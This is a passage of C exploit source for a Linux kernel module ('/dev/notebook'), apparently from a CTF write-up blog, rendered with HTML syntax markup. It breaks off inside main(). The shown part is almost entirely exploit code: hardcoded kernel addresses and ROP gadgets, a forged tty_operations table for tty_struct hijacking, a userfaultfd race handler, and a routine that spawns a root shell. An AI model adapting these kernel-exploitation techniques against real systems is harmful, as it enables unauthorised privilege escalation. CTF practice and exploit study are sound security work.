class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc -o try -pthread -static -masm=intel -Os try.c -lutil</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81a00929 </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> cred_init 0xffffffff8250a0e9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> init_cred 0xffffffff8225c940</span><br><span class="hljs-comment">//root and no kaslr:cat /proc/kallsyms|grep &quot;swapgs_restore_regs_and_return_to_usermode&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret 0xffffffff81238d50</span><br><span class="hljs-comment">//0xffffffff81238d50 : push rdi ; pop rsp ; pop rbp ; add rax, rdx ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mov_rsp_rbp_pop_rbp_ret 0xffffffff8107875c</span><br><span class="hljs-comment">//0xffffffff8107875c : mov rsp, rbp ; pop rbp ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rbx_pop_rbp_ret 0xffffffff81002141</span><br><span class="hljs-comment">//0xffffffff81002141 : pop rbx ; pop rbp ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rbp_ret 0xffffffff81000367</span><br><span class="hljs-comment">//0xffffffff81000367 : pop rbp ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdi_ret 0xffffffff81007115</span><br><span class="hljs-comment">//0xffffffff81007115 : pop rdi ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ret 0xffffffff81000091</span><br><span class="hljs-comment">//0xffffffff81000091 : ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mov_rdi_rax_call_rdx 0xffffffff8250747f</span><br><span class="hljs-comment">//0xffffffff8250747f : mov rdi, rax ; call rdx</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rdx_ret 0xffffffff81358842</span><br><span class="hljs-comment">//0xffffffff81358842 : pop rdx ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rcx_ret 0xffffffff812688f3</span><br><span class="hljs-comment">//0xffffffff812688f3 : pop rcx ; ret</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mov_rdi_rax_pop_rbp_ret 0xffffffff81045833</span><br><span class="hljs-comment">// mov rdi, rax; xor eax, eax; cmp rdi, 0x9000000; je 0x245843; pop rbp; ret; ???</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mov_cr4_rdi_pop_rbp_ret 0xffffffff8101e9f0</span><br><span class="hljs-comment">//0xffffffff8101e9f0 : mov cr4, rdi ; pop rbp ; ret</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> pop_rax_ret 0xffffffff81540d04</span><br><span class="hljs-comment">//0xffffffff81540d04 : pop rax ; ret</span><br><br><span class="hljs-type">int</span> note_fd=<span class="hljs-number">-1</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> tty_fd[<span class="hljs-number">0x800</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">char</span> *buf,*page;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> cnt;<br><span class="hljs-type">void</span> * kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> kernel_offset = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">sem_t</span> sem_add, sem_edit;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">notearg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span>* buf;<br>&#125; Note;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">void</span>* buf;<br>    <span class="hljs-type">size_t</span> size;<br>    <br>&#125;notebook[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_struct</span> * (*<span class="hljs-title">lookup</span>)(<span class="hljs-keyword">struct</span> <span class="hljs-title">tty_driver</span> *<span class="hljs-title">driver</span>,</span><br><span class="hljs-class">            <span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>, <span class="hljs-title">int</span> <span class="hljs-title">idx</span>);</span><br>    <span class="hljs-type">int</span>  (*install)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*remove)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*open)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> tty_struct * tty, <span class="hljs-keyword">struct</span> file * filp);<br>    <span class="hljs-type">void</span> (*shutdown)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*cleanup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*write)(<span class="hljs-keyword">struct</span> tty_struct * tty,<br>              <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">int</span> count);<br>    <span class="hljs-type">int</span>  (*put_char)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">void</span> (*flush_chars)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*write_room)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*chars_in_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span>  (*ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">long</span> (*compat_ioctl)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                 <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg);<br>    <span class="hljs-type">void</span> (*set_termios)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> ktermios * old);<br>    <span class="hljs-type">void</span> (*throttle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*unthrottle)(<span class="hljs-keyword">struct</span> tty_struct * tty);<br>    <span class="hljs-type">void</span> (*stop)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*start)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*hangup)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*break_ctl)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> state);<br>    <span class="hljs-type">void</span> (*flush_buffer)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*set_ldisc)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">void</span> (*wait_until_sent)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">int</span> timeout);<br>    <span class="hljs-type">void</span> (*send_xchar)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-type">char</span> ch);<br>    <span class="hljs-type">int</span> (*tiocmget)(<span class="hljs-keyword">struct</span> tty_struct *tty);<br>    <span class="hljs-type">int</span> (*tiocmset)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">set</span>, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> clear);<br>    <span class="hljs-type">int</span> (*resize)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> winsize *ws);<br>    <span class="hljs-type">int</span> (*set_termiox)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> termiox *tnew);<br>    <span class="hljs-type">int</span> (*get_icount)(<span class="hljs-keyword">struct</span> tty_struct *tty,<br>                <span class="hljs-keyword">struct</span> serial_icounter_struct *icount);<br>    <span class="hljs-type">void</span> (*show_fdinfo)(<span class="hljs-keyword">struct</span> tty_struct *tty, <span class="hljs-keyword">struct</span> seq_file *m);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span><br>    <span class="hljs-type">int</span> (*poll_init)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> *options);<br>    <span class="hljs-type">int</span> (*poll_get_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line);<br>    <span class="hljs-type">void</span> (*poll_put_char)(<span class="hljs-keyword">struct</span> tty_driver *driver, <span class="hljs-type">int</span> line, <span class="hljs-type">char</span> ch);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> *<span class="hljs-title">proc_fops</span>;</span><br>&#125;;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx,<span class="hljs-type">size_t</span> size,<span class="hljs-type">char</span>* buf)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">0x100</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">0x200</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx,<span class="hljs-type">size_t</span> size,<span class="hljs-type">char</span>* buf)</span>&#123;<br>    Note note = &#123;<br>        .idx=idx,<br>        .size=size,<br>        .buf=buf,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">0x300</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">gift</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf)</span>&#123;<br>    Note note = &#123;<br>        .buf=buf,<br>    &#125;;<br>    ioctl(note_fd,<span class="hljs-number">100</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hexdump</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(size/<span class="hljs-number">8</span>);i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[96m\e[1m[+%02x]:\t0x%016llx\e[0m\n&quot;</span>, i*<span class="hljs-number">8</span>, *(<span class="hljs-type">size_t</span> *)(buf + i*<span class="hljs-number">8</span>));<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-type">pthread_t</span> monitor_thread;<br><span class="hljs-type">void</span> <span class="hljs-title function_">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, (<span class="hljs-type">void</span> * (*)(<span class="hljs-type">void</span> *))handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-type">int</span> page_size=sysconf(_SC_PAGESIZE);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd Start!\e[0m\n&quot;</span>);<br>        <br>        <span class="hljs-comment">/*stop to do what?*/</span><br>        sleep(<span class="hljs-number">100</span>);<br>        <span class="hljs-comment">/**/</span><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd done!\e[0m\n&quot;</span>);<br>        <span class="hljs-comment">//cnt++;</span><br><br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evil_edit</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    sem_wait(&amp;sem_edit);<br>    edit((<span class="hljs-type">int</span>)args,<span class="hljs-number">0x2000</span>,buf);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evil_add</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    sem_wait(&amp;sem_add);<br>    add((<span class="hljs-type">int</span>)args,<span class="hljs-number">0x50</span>,buf);<br>&#125;<br><br><br><span class="hljs-type">pthread_t</span> <span class="hljs-type">edit_t</span>,<span class="hljs-type">add_t</span>;<br><span class="hljs-type">size_t</span> tty_data[<span class="hljs-number">0x200</span>], fake_tty_data[<span class="hljs-number">0x200</span>], tty_ops, fake_tty_ops_data[<span class="hljs-number">0x200</span>], rop[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> tty_idx,hit_tty;<br><span class="hljs-type">int</span> fake_tty_ops_idx=<span class="hljs-number">-1</span>;<br><span class="hljs-type">int</span> fake_stack_idx=<span class="hljs-number">-1</span>;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">cpu_set_t</span> pwn_cpu;<br>CPU_ZERO(&amp;pwn_cpu);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;pwn_cpu);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    sem_init(&amp;sem_add, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    sem_init(&amp;sem_edit, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    saveStatus();<br>    note_fd=open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span> (note_fd==<span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;fuck 